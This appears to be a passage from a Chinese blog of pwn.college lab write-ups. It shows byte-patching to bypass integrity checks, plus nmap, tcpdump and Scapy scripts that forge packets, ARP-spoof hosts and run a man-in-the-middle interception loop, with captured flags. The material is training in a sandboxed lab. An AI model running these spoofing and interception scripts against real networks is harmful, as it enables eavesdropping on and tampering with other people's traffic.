<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Changing byte 1/1.</span><br><span class="line">Offset (hex) to change: 0x21bb</span><br><span class="line">New value (hex): 0x74</span><br><span class="line">The byte has been changed: *0x55dca42621bb = 74.</span><br></pre></td></tr></tbody></table></figure>
<p>然后任意输入几个字符串，回车得到flag</p></li>
<li><p>level10.1：同上</p></li>
<li><p>level11.0：可以修改两个字节，但是会检查文件完整性（哈希值）</p>
<p>wp：使用IDA查看伪代码，发现<code>memcmp</code>使用了两次（先比较哈希值，然后比较md5值），所以修改这两次条件跳转即可</p></li>
<li><p>level11.1：修改两个字节，检查文件完整性</p>
<p>wp：我一开始以为和11.0是一样的，但是输入两个修改字节后总是会有<code>Segmentation fault</code>，于是打开IDA查看两个条件跳转的十六进制（左边是地址，右边是指令的十六进制形式）：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x1B4D:    0F 85 E3 00 00 00</span><br><span class="line">0x1C32:    75 2C</span><br></pre></td></tr></tbody></table></figure>
<p>经过查询，有下面的知识点：</p>
<blockquote>
<p>在 x86 和 x86-64 指令集中，<code>jne</code>
指令有两种编码方式，这取决于跳转的目标距离（即跳转的字节偏移量）。</p>
<ol type="1">
<li><strong>短跳转</strong>：使用 8 位偏移量进行跳转，偏移量范围为 -128
到 127 字节。这种情况下，<code>jne</code> 的操作码为
<code>75</code>。</li>
<li><strong>长跳转</strong>：使用 32 位偏移量进行跳转，偏移量范围为
-2,147,483,648 到 2,147,483,647 字节。这种情况下，<code>jne</code>
的操作码为 <code>0F 85</code>。</li>
</ol>
</blockquote>
<p>所以输入偏移量时注意对应的字节：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Changing byte 1/2.</span><br><span class="line">Offset (hex) to change: 0x1b4e</span><br><span class="line">New value (hex): 0x84</span><br><span class="line">The byte has been changed: *0x55a4b4324b4e = 84.</span><br><span class="line">Changing byte 2/2.</span><br><span class="line">Offset (hex) to change: 0x1c32</span><br><span class="line">New value (hex): 0x74</span><br><span class="line">The byte has been changed: *0x55a4b4324c32 = 74.</span><br></pre></td></tr></tbody></table></figure>
<p>然后任意输入几个字符，回车得到flag</p></li>
</ul>
<h2 id="intercepting-communication">Intercepting Communication</h2>
<h3 id="知识点-4">知识点</h3>
<ul>
<li>以太网：通过Mac地址通信</li>
<li>IP协议：首部结构</li>
<li>TCP协议：首部结构，标志位</li>
<li>ARP协议</li>
<li>三次握手</li>
<li>工具：nc、tcpdump、ip、ifconfig、nmap</li>
</ul>
<h3 id="练习-4">练习</h3>
<ul>
<li><p>level1：连接远程主机</p>
<p>wp：监听目标主机的特定端口</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.0.0.3 31337</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level2：监听特定端口</p>
<p>wp：监听本地计算机上的端口</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 31337</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level3：查找同一子网下的IP并监听31337端口</p>
<p>wp：使用nmap扫描同一子网下的IP，找到目标IP，然后使用nc连接对应端口</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-0-2:~# nmap 10.0.0.0/24</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-28 09:54 UTC</span><br><span class="line">Nmap scan report for 10.0.0.129</span><br><span class="line">Host is up (0.000015s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">31337/tcp open  Elite</span><br><span class="line">MAC Address: 2A:AF:7A:12:1A:FC (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.0.0.2</span><br><span class="line">Host is up (0.000010s latency).</span><br><span class="line">All 1000 scanned ports on 10.0.0.2 are closed</span><br><span class="line"></span><br><span class="line">Nmap done: 256 IP addresses (2 hosts up) scanned in 30.76 seconds</span><br><span class="line">root@ip-10-0-0-2:~# nc 10.0.0.129 31337</span><br><span class="line">pwn.college{oLZJSPC2WRMKubBDqz6KTgcvMm2.dFjNzMDLycDMyUzW}</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level4：在一个很大范围的子网中找到并连接目标主机</p>
<p>wp：与上一关解法相同，但是运行时间太长了</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  10.0.0.0/16</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level5：监测远程主机的流量</p>
<p><code>tcpdump</code>
是一个命令行数据包分析器，它可以捕获和分析网络流量。要监测特定端口上的流量</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0&lt;网络接口&gt; port 31337  </span><br></pre></td></tr></tbody></table></figure>
<p><code>tcpdump</code>
可以显示数据包的内容。要查看数据包的实际内容（包括负载），可以使用
<code>-X</code> （显示数据包的十六进制和ASCII内容）或 <code>-A</code>
选项（只显示数据包的ASCII内容）。</p>
<p>wp：首先通过<code>ifconfig</code>查看网络接口</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.0.0.2  netmask 255.255.0.0  broadcast 0.0.0.0</span><br><span class="line">        inet6 fe80::60f7:ff:fe14:fbea  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 62:f7:00:14:fb:ea  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 43  bytes 3498 (3.4 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 20  bytes 1668 (1.6 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536    # 用于本地通信</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></tbody></table></figure>
<p>发现<code>eth0</code>接口，然后使用
<code>tcpdump -A -i eth0 port 31337</code> 得到flag</p></li>
<li><p>level6：监控远程主机的慢速流量（其实就是一个一个字符发送）</p>
<p>wp：如果直接用<code>tcpdump -A -i eth0 port 31337</code>，会显示一大堆没用的信息，不过可以得知是<code>10.0.0.3</code>向本机发送数据，可以使用命令<code>tcpdump -A -i eth0 src host 10.0.0.3 and dst host 10.0.0.2</code>，发现每次发送一个字符，所以可以用下面的脚本提取字符串：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag=<span class="string">''</span></span><br><span class="line">    buffer = []</span><br><span class="line">    recording = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> sys.stdin:</span><br><span class="line">        line = line.rstrip()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 当检测到包含 "length 1" 的行时</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'length 1'</span> <span class="keyword">in</span> line:</span><br><span class="line">            recording = <span class="literal">True</span></span><br><span class="line">            buffer = []</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">'length 0'</span> <span class="keyword">in</span> line:</span><br><span class="line">            recording = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> recording:</span><br><span class="line">            buffer.append(line)</span><br><span class="line">            <span class="comment"># 记录的行数达到 4 行时</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(buffer) == <span class="number">4</span>:</span><br><span class="line">                <span class="comment"># 输出最后一行的最后一个字符</span></span><br><span class="line">                last_line = buffer[-<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">if</span> last_line:</span><br><span class="line">                    last_char = last_line[-<span class="number">1</span>]</span><br><span class="line">                    flag+=last_char</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f"Last character extracted: <span class="subst">{flag}</span>"</span>)</span><br><span class="line">                <span class="comment"># 重置记录状态</span></span><br><span class="line">                recording = <span class="literal">False</span></span><br><span class="line">                buffer = []</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure>
<p>然后将tcpdump回显传给该脚本，得到flag（可能要多运行几次才能得到完整正确的flag）</p>
<p><code>tcpdump -A -i eth0 src host 10.0.0.3 and dst host 10.0.0.2 | python getflag.py</code></p>
<p>pwn.college{cTd7x9tiz-q-32migfK6GPucpAX.dRjNzMDLycDMyUzW}</p></li>
<li><p>level7：通过配置网络接口拦截远程主机的流量</p>
<p>wp：这题一开始没什么思路，
然后突然想到ARP协议，准备使用ARP欺骗，但是相关工具用不了，于是先使用<code>tcpdump -i eth0</code>查看本机的流量情况：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tcpdump: verbose output suppressed, use -v[v]... for full protocol decode</span><br><span class="line">listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes</span><br><span class="line">08:50:00.376706 ARP, Request who-has 10.0.0.2 tell 10.0.0.4, length 28</span><br><span class="line">08:50:01.377721 ARP, Request who-has 10.0.0.2 tell 10.0.0.4, length 28</span><br><span class="line">08:50:02.379126 ARP, Request who-has 10.0.0.2 tell 10.0.0.4, length 28</span><br></pre></td></tr></tbody></table></figure>
<p>发现本机一直能够接收到10.0.0.4发送的ARP信息，然后就需要把我们的主机伪装成10.0.0.2，但是我不会怎么操作<span class="github-emoji"><span>😓</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f613.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>，参考<a target="_blank" rel="noopener" href="https://tephrocactusmyc.github.io/CTF-CLASS/CSE365/Intercepting-Communication.html">大佬的wp</a>，得知<code>ip</code>命令（用于配置和查看Linux网络设备和接口的工具），通过<code>ip addr add 10.0.0.2/24 dev eth0</code>为网络接口添加IP地址，然后监测流量：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-0-3:~# tcpdump -i eth0</span><br><span class="line">tcpdump: verbose output suppressed, use -v[v]... for full protocol decode</span><br><span class="line">listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes</span><br><span class="line">08:53:25.649323 ARP, Request who-has 10.0.0.2 tell 10.0.0.4, length 28</span><br><span class="line">08:53:25.649344 ARP, Reply 10.0.0.2 is-at fe:b4:c0:4c:6b:f3 (oui Unknown), length 28</span><br><span class="line">08:53:25.649377 IP 10.0.0.4.40878 &gt; 10.0.0.2.31337: Flags [S], seq 2328130165, win 64240, options [mss 1460,sackOK,TS val 4097716417 ecr 0,nop,wscale 7], length 0</span><br></pre></td></tr></tbody></table></figure>
<p>发现成功挟持流量，然后使用<code>nc -l 31337</code>查看flag</p></li>
<li><p>level8：手动发送以太帧</p>
<blockquote>
<p>Scapy是一个强大的Python库，用于网络数据包的生成、操作、嗅探和伪造。它支持大量的网络协议，包括以太网、IP、TCP、UDP等，使用户可以轻松地构建、发送和接收数据包</p>
<p>示例：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> Ether, sendp</span><br><span class="line"></span><br><span class="line">packet = Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, src=<span class="string">"01:02:03:04:05:06"</span>, <span class="built_in">type</span>=<span class="number">0x0800</span>)</span><br><span class="line">sendp(packet, iface=<span class="string">"eth0"</span>)</span><br></pre></td></tr></tbody></table></figure>
</blockquote>
<p>wp：首先通过<code>ip addr show</code>查看本机MAC地址，然后通过上面的Python库编写脚本发送数据包（广播）</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">packet = Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, src=<span class="string">"de:33:4e:45:7f:2e"</span>, <span class="built_in">type</span>=<span class="number">0xFFFF</span>)</span><br><span class="line">sendp(packet, iface=<span class="string">"eth0"</span>)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level9：手动发送IP分组，下面是scapy库使用示例</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> IP, send</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建一个IP数据包</span></span><br><span class="line">packet = IP(</span><br><span class="line">    dst=<span class="string">"8.8.8.8"</span>,           <span class="comment"># 目标IP地址</span></span><br><span class="line">    src=<span class="string">"10.0.0.1"</span>,          <span class="comment"># 源IP地址</span></span><br><span class="line">    ttl=<span class="number">128</span>,                 <span class="comment"># TTL值</span></span><br><span class="line">    <span class="built_in">id</span>=<span class="number">12345</span>,                <span class="comment"># 数据包标识符</span></span><br><span class="line">    flags=<span class="string">"DF"</span>,              <span class="comment"># Don't Fragment标志</span></span><br><span class="line">    tos=<span class="number">0x10</span>,                <span class="comment"># 服务类型</span></span><br><span class="line">    proto=<span class="number">1</span>                  <span class="comment"># ICMP协议</span></span><br><span class="line">) / <span class="string">"Hello, World!"</span>          <span class="comment"># 数据负载</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送数据包</span></span><br><span class="line">send(packet)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>wp：直接根据上述代码构造IP分组，未知的参数就省略，但是运行结果报错<code>WARNING: No route found (no default route?)</code>，找不到有效路由，还是得通过数据链路层发送</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> Ether, IP, sendp</span><br><span class="line"><span class="comment"># 数据包的构造： Ether / IP / data</span></span><br><span class="line">packet = Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, src=<span class="string">"be:08:7d:7b:c4:96"</span>, <span class="built_in">type</span>=<span class="number">0x0800</span>) / IP(dst=<span class="string">"10.0.0.3"</span>, src=<span class="string">"10.0.0.2"</span>, proto=<span class="number">0xFF</span>)</span><br><span class="line">sendp(packet, iface=<span class="string">"eth0"</span>)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level10：手动发送TCP报文段</p>
<p>wp：思路同上</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> Ether, IP, TCP, sendp</span><br><span class="line"></span><br><span class="line">packet = Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, src=<span class="string">"4a:b6:df:8e:bd:97"</span>, <span class="built_in">type</span>=<span class="number">0x0800</span>) / IP(dst=<span class="string">"10.0.0.3"</span>, src=<span class="string">"10.0.0.2"</span>, proto=<span class="number">0x6</span>) / TCP(sport=<span class="number">31337</span>, dport=<span class="number">31337</span>, seq=<span class="number">31337</span>, ack=<span class="number">31337</span>, flags=<span class="string">"APRSF"</span>)</span><br><span class="line">sendp(packet, iface=<span class="string">"eth0"</span>)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level11：手动模拟TCP三次握手</p>
<p>wp：这里用到 tmux
分屏查看流量细节。左右分屏后在左边终端运行<code>tcpdump -i eth0</code>监测流量，然后在右边终端中运行下面的脚本</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> Ether, IP, TCP, sendp</span><br><span class="line"></span><br><span class="line">packet1 = Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, src=<span class="string">"9e:21:1d:a7:07:e7"</span>, <span class="built_in">type</span>=<span class="number">0x0800</span>) / IP(dst=<span class="string">"10.0.0.3"</span>, src=<span class="string">"10.0.0.2"</span>, proto=<span class="number">0x6</span>) / TCP(sport=<span class="number">31337</span>, dport=<span class="number">31337</span>, seq=<span class="number">31337</span>, flags=<span class="string">"S"</span>)</span><br><span class="line">sendp(packet1, iface=<span class="string">"eth0"</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>此时左边终端出现TCP流量：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes             14:13:39.439207 IP 10.0.0.2.31337 &gt; 10.0.0.3.31337: Flags [S], seq 31337, win 8192, length 0                                                                             14:13:39.478926 IP 10.0.0.3.31337 &gt; 10.0.0.2.31337: Flags [S.], seq 558135948, ack 31338, win 8192, length 0 </span><br></pre></td></tr></tbody></table></figure>
<p>得到第三次TCP握手需要发送的<code>ack</code>的值<code>558135948+1</code>，然后运行下一个脚本，得到flag</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> Ether, IP, TCP, sendp</span><br><span class="line"></span><br><span class="line">packet2 = Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, src=<span class="string">"9e:21:1d:a7:07:e7"</span>, <span class="built_in">type</span>=<span class="number">0x0800</span>) / IP(dst=<span class="string">"10.0.0.3"</span>, src=<span class="string">"10.0.0.2"</span>, proto=<span class="number">0x6</span>) / TCP(sport=<span class="number">31337</span>, dport=<span class="number">31337</span>, seq=<span class="number">31338</span>, ack=<span class="number">558135949</span>, flags=<span class="string">"A"</span>)</span><br><span class="line">sendp(packet2, iface=<span class="string">"eth0"</span>)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level12：手动发送ARP数据包</p>
<p>wp：思路同上</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arp_packet = Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, src=<span class="string">"9e:4a:21:ea:20:33"</span>) / ARP(</span><br><span class="line">    pdst=<span class="string">"10.0.0.3"</span>,</span><br><span class="line">    hwdst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>,  <span class="comment"># 广播或目标主机的 MAC 地址</span></span><br><span class="line">    psrc=<span class="string">"10.0.0.2"</span>,</span><br><span class="line">    hwsrc=<span class="string">"9e:4a:21:ea:20:33"</span>,</span><br><span class="line">    op=<span class="string">"is-at"</span></span><br><span class="line">)</span><br><span class="line">sendp(arp_packet, iface=<span class="string">"eth0"</span>)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level13：使用ARP挟持远程主机的流量</p>
<p>wp：利用scapy库实现</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arp_spoof = ARP(</span><br><span class="line">    pdst=<span class="string">"10.0.0.4"</span>,       <span class="comment"># 目标主机的 IP 地址</span></span><br><span class="line">    hwdst=<span class="string">"1A:25:92:8C:AD:4C"</span>,  <span class="comment"># 广播或目标主机的 MAC 地址</span></span><br><span class="line">    psrc=<span class="string">"10.0.0.2"</span>,        <span class="comment"># 欺骗的 IP 地址（假装这是你的 IP）</span></span><br><span class="line">    hwsrc=<span class="string">"aa:12:c3:a5:1b:9c"</span>,  <span class="comment"># 欺骗的 MAC 地址（用你的 MAC 地址）</span></span><br><span class="line">    op=<span class="string">"is-at"</span>                    <span class="comment"># 操作码 2 表示 ARP 回复</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 ARP 欺骗包</span></span><br><span class="line">send(arp_spoof)</span><br></pre></td></tr></tbody></table></figure>
<p>注意源IP地址是你需要利用的地址而不是你自己的IP地址，然后查看流量获取flag</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -A -i eth0</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level14：中间人攻击</p>
<p>wp：这里需要编写脚本进行ARP欺骗，让10.0.0.4主机认为我是10.0.0.3，让10.0.0.3认为我是10.0.0.4，从而实现拦截流量的目的。下面这段代码可以实现对应功能（用chatGPT生成的）</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> scapy.layers.http <span class="keyword">import</span> HTTPRequest, HTTPResponse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置要攻击的 IP 地址</span></span><br><span class="line">target_ip1 = <span class="string">"10.0.0.4"</span></span><br><span class="line">target_ip2 = <span class="string">"10.0.0.2"</span></span><br><span class="line">iface = <span class="string">"eth0"</span>  <span class="comment"># 网络接口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于 ARP 欺骗的目标 MAC 地址</span></span><br><span class="line">target_mac1 = <span class="string">"xx:xx:xx:xx:xx:xx"</span></span><br><span class="line">target_mac2 = <span class="string">"yy:yy:yy:yy:yy:yy"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arp_spoof</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        send(ARP(op=<span class="number">2</span>, pdst=target_ip1, hwdst=target_mac1, psrc=target_ip2), iface=iface)</span><br><span class="line">        send(ARP(op=<span class="number">2</span>, pdst=target_ip2, hwdst=target_mac2, psrc=target_ip1), iface=iface)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">packet_callback</span>(<span class="params">packet</span>):</span><br><span class="line">    <span class="keyword">if</span> packet.haslayer(HTTPRequest):</span><br><span class="line">        <span class="keyword">if</span> packet[HTTPRequest].Method == <span class="string">b"GET"</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"Intercepted GET request to <span class="subst">{packet[HTTPRequest].Host}</span><span class="subst">{packet[HTTPRequest].Path}</span>"</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 这里可以添加额外的流量或修改数据包</span></span><br><span class="line">            packet[IP].src = target_ip2</span><br><span class="line">            send(packet, iface=iface)</span><br><span class="line">    <span class="keyword">elif</span> packet.haslayer(HTTPResponse):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"Intercepted HTTP response from <span class="subst">{packet[IP].src}</span>"</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 可以在这里修改响应内容</span></span><br><span class="line">        packet[IP].dst = target_ip1</span><br><span class="line">        send(packet, iface=iface)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># 启动 ARP 欺骗线程</span></span><br><span class="line">    <span class="keyword">import</span> threading</span><br><span class="line">    arp_thread = threading.Thread(target=arp_spoof)</span><br><span class="line">    arp_thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始嗅探和修改流量</span></span><br><span class="line">    sniff(iface=iface, prn=packet_callback, store=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>运行完该脚本后，通过<code>tcpdump -A -i eth0</code>监听流量，发现：10.0.0.3首先发送<em>SECRET</em>，然后10.0.0.4回复一串ASCii码，接着10.0.0.3发送<em>COMMANDS::，接着10.0.0.4回复</em>ECHO<em>，然后10.0.0.3发送</em>Hello
world！<em>。由此得出，若10.0.0.4发送包含</em>FLAG*的数据包，则会返回flag。但是脚本不会写，参考<a target="_blank" rel="noopener" href="https://tephrocactusmyc.github.io/CTF-CLASS/CSE365/Intercepting-Communication.html">大佬的wp</a>。</p></li>
</ul>
<h2 id="cryptography">Cryptography</h2>
<h3 id="知识点-5">知识点</h3>
<h4 id="symmetric-encryption对称加密">Symmetric
Encryption（对称加密）</h4>
<ul>
<li><p>One-Time
